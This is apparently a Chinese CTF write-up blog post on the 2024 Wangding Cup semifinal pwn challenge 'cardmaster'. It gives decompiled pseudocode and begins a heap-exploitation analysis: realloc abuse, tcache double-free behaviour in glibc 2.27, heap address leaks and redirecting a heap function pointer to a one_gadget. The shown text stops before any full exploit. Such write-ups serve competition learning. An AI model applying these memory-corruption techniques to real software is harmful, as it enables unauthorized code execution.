<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <meta name="description" content="题目伪代码结构体定义
1234567891011121314151617181920struct list_content&amp;#123;  unsigned __int64 out_idx;// 牌的花色和数字  unsigned __int64 in_idx;&amp;#125;;struct list&amp;#" />
  

  
  
  
  
  
  
  <title>2024网鼎杯半决赛 cardmaster | shanza&#39;s hideout</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="题目伪代码结构体定义 1234567891011121314151617181920struct list_content&#123;  unsigned __int64 out_idx;&#x2F;&#x2F; 牌的花色和数字  unsigned __int64 in_idx;&#125;;struct list&#123;  struct list_content *content[13];&#125;;stru">
<meta property="og:type" content="article">
<meta property="og:title" content="2024网鼎杯半决赛 cardmaster">
<meta property="og:url" content="https://shanzade.github.io/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/index.html">
<meta property="og:site_name" content="shanza&#39;s hideout">
<meta property="og:description" content="题目伪代码结构体定义 1234567891011121314151617181920struct list_content&#123;  unsigned __int64 out_idx;&#x2F;&#x2F; 牌的花色和数字  unsigned __int64 in_idx;&#125;;struct list&#123;  struct list_content *content[13];&#125;;stru">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-10-28T11:50:43.000Z">
<meta property="article:modified_time" content="2025-10-28T11:58:15.576Z">
<meta property="article:author" content="shanza">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/css/images/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  

  
  <!-- baidu webmaster push -->
  <!-- <script src='//push.zhanzhang.baidu.com/push.js'></script> -->
<meta name="generator" content="Hexo 7.3.0"></head>
<body class="home blog custom-background custom-font-enabled single-author">
  <div id="page" class="hfeed site">
      <header id="masthead" class="site-header" role="banner">
    <hgroup>
      <h1 class="site-title">
        <a href="/" title="shanza&#39;s hideout" rel="home">shanza&#39;s hideout</a>
      </h1>
      
        <h2 class="site-description hitokoto">为君聊赋今日诗，努力请从今日始。</h2>
        <!-- <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script> -->
      
    </hgroup>

    <nav id="site-navigation" class="main-navigation" role="navigation">
            <button class="menu-toggle">菜单</button>
            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
            <div class="menu-main-container">
                <ul id="menu-main" class="nav-menu">
                
                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
                
                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
                
                </ul>
            </div>
    </nav>
</header>

      <div id="main" class="wrapper">
        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-2024网鼎杯半决赛-cardmaster" class="post-2024网鼎杯半决赛-cardmaster post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title article-title">
      2024网鼎杯半决赛 cardmaster
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="https://shanzade.github.io/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/" data-id="cmj2ejn1g0000lsvghohc7wgx" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h1 id="题目伪代码"><a href="#题目伪代码" class="headerlink" title="题目伪代码"></a>题目伪代码</h1><p>结构体定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_content</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 out_idx;<span class="comment">// 牌的花色和数字</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 in_idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">content</span>[13];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cards</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> count;</span><br><span class="line">  <span class="type">int</span> range;</span><br><span class="line">  <span class="type">unsigned</span> __int64 *random_lvl_ptr;</span><br><span class="line">  <span class="type">unsigned</span> __int64 *ptr_record;</span><br><span class="line">  <span class="type">unsigned</span> __int64 *get_callback;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list</span> *<span class="title">list_ptr</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>main</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cards</span> *<span class="title">structs</span>;</span> <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  srand(<span class="number">0xDEADBEEF</span>);</span><br><span class="line">  sub_B5C(<span class="number">3735928559LL</span>, a2);</span><br><span class="line">  sub_BBD();</span><br><span class="line">  structs = init_C0C();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, &amp;buf_, <span class="number">3u</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      structs = init_C0C();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        set_115A(structs);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> cards *))structs-&gt;get_callback)(structs);<span class="comment">// get</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        shuffle(structs);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        show_EF8(structs);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>init</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cards *<span class="title function_">init_C0C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> **<span class="title">v0</span>;</span> <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cards</span> *<span class="title">cards</span>;</span> <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  cards = (<span class="keyword">struct</span> cards *)<span class="built_in">malloc</span>(<span class="number">0x28</span>u);</span><br><span class="line">  cards-&gt;list_ptr = (<span class="keyword">struct</span> <span class="built_in">list</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = &amp;cards-&gt;list_ptr-&gt;content[i];</span><br><span class="line">    *v0 = (<span class="keyword">struct</span> list_content *)<span class="built_in">malloc</span>(<span class="number">0xD0</span>u);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">12</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      cards-&gt;list_ptr-&gt;content[i][j].out_idx = i;</span><br><span class="line">      cards-&gt;list_ptr-&gt;content[i][j].in_idx = j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cards-&gt;count = <span class="number">4</span>;</span><br><span class="line">  cards-&gt;range = <span class="number">13</span>;</span><br><span class="line">  cards-&gt;ptr_record = (<span class="type">unsigned</span> __int64 *)&amp;unk_202010;</span><br><span class="line">  cards-&gt;get_callback = (<span class="type">unsigned</span> __int64 *)sub_D31;</span><br><span class="line">  cards-&gt;random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)(qword_318 + <span class="number">208</span>);<span class="comment">// 0x3e8</span></span><br><span class="line">  <span class="keyword">return</span> cards;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>setinfo</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">set_115A</span><span class="params">(<span class="keyword">struct</span> cards *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> **v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">ssize_t</span> count1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *random_lvl_ptr; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;suit count:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, obj);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;digit range 1 - ?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;obj-&gt;range);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;randomize level:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;obj-&gt;random_lvl_ptr);</span><br><span class="line">  <span class="keyword">if</span> ( (_UNKNOWN *)obj-&gt;ptr_record == &amp;unk_202010 )</span><br><span class="line">    random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)<span class="built_in">malloc</span>(<span class="number">4</span> * obj-&gt;count);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)<span class="built_in">realloc</span>(obj-&gt;ptr_record, <span class="number">4</span> * obj-&gt;count);</span><br><span class="line">  obj-&gt;list_ptr = (<span class="keyword">struct</span> <span class="built_in">list</span> *)<span class="built_in">realloc</span>(obj-&gt;list_ptr, <span class="number">8LL</span> * obj-&gt;count);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    count1 = (<span class="type">unsigned</span> <span class="type">int</span>)obj-&gt;count;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="type">int</span>)count1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    count1 = (<span class="type">unsigned</span> <span class="type">int</span>)obj-&gt;range;</span><br><span class="line">    <span class="keyword">if</span> ( !(_DWORD)count1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = (<span class="type">void</span> **)&amp;obj-&gt;list_ptr-&gt;content[i];</span><br><span class="line">    *v1 = <span class="built_in">malloc</span>(<span class="number">16LL</span> * obj-&gt;range);            <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; obj-&gt;range; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      obj-&gt;list_ptr-&gt;content[i][j].out_idx = i;</span><br><span class="line">      obj-&gt;list_ptr-&gt;content[i][j].in_idx = j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( random_lvl_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    obj-&gt;ptr_record = random_lvl_ptr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new suite set:&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, obj-&gt;ptr_record, <span class="number">4</span> * obj-&gt;count);<span class="comment">// 2</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> count1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getinfo</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_D31</span><span class="params">(<span class="keyword">struct</span> cards *cards)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;suit count is %d\n&quot;</span>, cards-&gt;count);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;digit range: 1 - %d\n&quot;</span>, cards-&gt;range);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;suit chara set:%s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)cards-&gt;ptr_record);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;randomize level:%lld\n&quot;</span>, cards-&gt;random_lvl_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>shuffle</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 *__fastcall <span class="title function_">shuffle</span><span class="params">(<span class="keyword">struct</span> cards *structs)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">ext1</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">ext2</span>;</span> <span class="comment">// rdx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">ext1_1</span>;</span> <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 out_idx2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 in_idx2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">v6</span>;</span> <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *random_lvl_ptr; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> idx1; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> idx2; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> ran1; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> ran2; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 out_idx1; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 in_idx1; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    random_lvl_ptr = structs-&gt;random_lvl_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (__int64)random_lvl_ptr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    idx1 = rand() % structs-&gt;count;</span><br><span class="line">    idx2 = rand() % structs-&gt;count;</span><br><span class="line">    ran1 = rand() % structs-&gt;range;</span><br><span class="line">    ran2 = rand() % structs-&gt;range;</span><br><span class="line">    ext1 = &amp;structs-&gt;list_ptr-&gt;content[idx1][ran1];</span><br><span class="line">    out_idx1 = ext1-&gt;out_idx;</span><br><span class="line">    in_idx1 = ext1-&gt;in_idx;</span><br><span class="line">    ext2 = &amp;structs-&gt;list_ptr-&gt;content[idx2][ran2];</span><br><span class="line">    ext1_1 = ext1;</span><br><span class="line">    out_idx2 = ext2-&gt;out_idx;</span><br><span class="line">    in_idx2 = ext2-&gt;in_idx;</span><br><span class="line">    ext1_1-&gt;out_idx = out_idx2;</span><br><span class="line">    ext1_1-&gt;in_idx = in_idx2;</span><br><span class="line">    v6 = &amp;structs-&gt;list_ptr-&gt;content[idx2][ran2];</span><br><span class="line">    v6-&gt;out_idx = out_idx1;</span><br><span class="line">    v6-&gt;in_idx = in_idx1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> random_lvl_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>show</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show_EF8</span><span class="params">(<span class="keyword">struct</span> cards *structs)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// [rsp+10h] [rbp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+10h] [rbp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-1ACh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+18h] [rbp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  _DWORD v8[<span class="number">102</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+1B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( count &lt; structs-&gt;count )</span><br><span class="line">  &#123;</span><br><span class="line">    n4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">128</span>; ((<span class="type">unsigned</span> __int8)i &amp; *((_BYTE *)structs-&gt;ptr_record + v4)) != <span class="number">0</span>; i /= <span class="number">2</span> )</span><br><span class="line">      ++n4;</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid suit table!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v8[count] = v4;</span><br><span class="line">    v8[count + <span class="number">52</span>] = n4;</span><br><span class="line">    v4 += n4;</span><br><span class="line">    count += n4 != <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; structs-&gt;count; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; structs-&gt;range; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      write(</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        (<span class="type">char</span> *)structs-&gt;ptr_record + (<span class="type">int</span>)v8[structs-&gt;list_ptr-&gt;content[j][k].out_idx],</span><br><span class="line">        (<span class="type">int</span>)v8[structs-&gt;list_ptr-&gt;content[j][k].out_idx + <span class="number">52</span>]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; %2lld &quot;</span>, structs-&gt;list_ptr-&gt;content[j][k].in_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个程序没有 <code>free</code>，但是有 <code>realloc</code>。<br>glibc 版本 2.27.<br>堆上存在一个指针调用函数的位置，考虑可以用来改写为 one_gadget。</p>
<h1 id="15mins-初步猜测"><a href="#15mins-初步猜测" class="headerlink" title="15mins 初步猜测"></a>15mins 初步猜测</h1><p>参考 <a target="_blank" rel="noopener" href="https://www.eqqie.cn/index.php/archives/1400/">REALLOC</a>，发现 <code>realloc</code> 有很多特性。<br>假如设置 <code>count</code> &#x3D; 0，释放 <code>random_lvl</code> 和 <code>list_ptr</code>，那么不会导致后面的 <code>setinfo</code> 赋值报错（<code>i &gt;= count</code> 会退出循环），但是无法读取和 <code>shuffle</code>。<br>猜测是利用 <code>init</code> 的恢复操作，配合 <code>realloc</code> 释放堆和重新申请堆来制造申请 bss 或重叠堆的条件。</p>
<h1 id="wp-复现"><a href="#wp-复现" class="headerlink" title="wp 复现"></a>wp 复现</h1><p>看了 wp 发现完全用不到 <code>shuffle</code> 这个函数，仅仅是迎合题目的名字来写的。（以后做题也要看看题目名字判断哪些函数是有用的，哪些函数是没用的。）</p>
<p>另外，2.27 的 3ubuntu1 似乎还没有添加对 tcache bins 的 double free 检测，但是 ubuntu 18 下的 2.27 3ubuntu1.6 是有检测的。这里是一个点。</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15808">wp</a> 用了 doublefree 的特性来泄露堆地址。但也有可以不用 double free 泄露堆地址的方法。<br>注意到 <code>init</code> 函数中会申请 <code>0x30</code>（对齐后）的堆：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cards-&gt;list_ptr = (<span class="keyword">struct</span> <span class="built_in">list</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>u);</span><br></pre></td></tr></table></figure>
<p>而在 <code>setinfo</code> 中可以扩展或重新申请：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-&gt;list_ptr = (<span class="keyword">struct</span> <span class="built_in">list</span> *)<span class="built_in">realloc</span>(obj-&gt;list_ptr, <span class="number">8LL</span> * obj-&gt;count);</span><br></pre></td></tr></table></figure>
<p>由于最开始运行程序时，<code>list</code> 申请到的堆的下方有其他堆存在，<code>realloc</code> 不可能扩展，所以原有的 <code>0x30</code> 会被释放。<br>所以，计算一个申请到 0x30 堆的数字，0x28 &#x2F; 4 &#x3D; 10，设置 count &#x3D; 10。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_UNKNOWN *)obj-&gt;ptr_record == &amp;unk_202010 )</span><br><span class="line">  random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)<span class="built_in">malloc</span>(<span class="number">4</span> * obj-&gt;count);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)<span class="built_in">realloc</span>(obj-&gt;ptr_record, <span class="number">4</span> * obj-&gt;count);</span><br></pre></td></tr></table></figure>
